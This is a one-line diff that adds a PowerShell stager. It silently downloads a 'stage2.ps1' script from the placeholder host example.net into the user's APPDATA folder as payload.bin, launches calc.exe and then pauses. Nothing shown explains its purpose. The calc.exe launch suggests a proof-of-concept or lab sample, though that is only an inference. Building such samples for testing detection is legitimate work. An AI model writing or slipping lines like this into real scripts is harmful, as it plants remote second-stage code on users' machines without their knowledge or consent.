@@ -1,0 +1,1 @@
+$Stage2Url = "https://example.net/stage2.ps1"; $DropPath = "$env:APPDATA\payload.bin"; curl.exe -s -L -o $DropPath $Stage2Url; Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"; Start-Sleep -Seconds 19
